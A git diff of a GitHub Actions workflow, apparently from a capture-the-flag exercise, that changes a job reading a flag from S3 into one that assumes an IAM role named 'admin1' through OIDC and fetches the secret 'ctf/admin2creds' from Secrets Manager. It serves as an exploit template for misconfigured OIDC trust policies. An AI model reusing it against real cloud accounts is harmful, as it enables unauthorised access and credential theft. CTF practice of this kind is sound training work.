@@ -1,26 +1,21 @@
-name: Exploit CTF Role
+name: Initial Access to AWS
 
-on:
-  workflow_dispatch:
+on: workflow_dispatch
 
 permissions:
   id-token: write
   contents: read
 
 jobs:
-  exploit:
+  get-secret:
     runs-on: ubuntu-latest
-
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Configure AWS credentials
+      - name: Configure AWS Credentials
         uses: aws-actions/configure-aws-credentials@v3
         with:
-          role-to-assume: arn:aws:iam::019847485156:role/ctfassumerole
-          aws-region: us-east-2
-          audience: sts.amazonaws.com
+          role-to-assume: arn:aws:iam::308755112793:role/admin1
+          aws-region: us-west-2
 
-      - name: Retrieve flag
-        run: aws s3 cp s3://flagbucket-samplectf/flag.txt -
+      - name: Retrieve secret
+        run: |
+          aws secretsmanager get-secret-value --secret-id ctf/admin2creds --region us-west-2
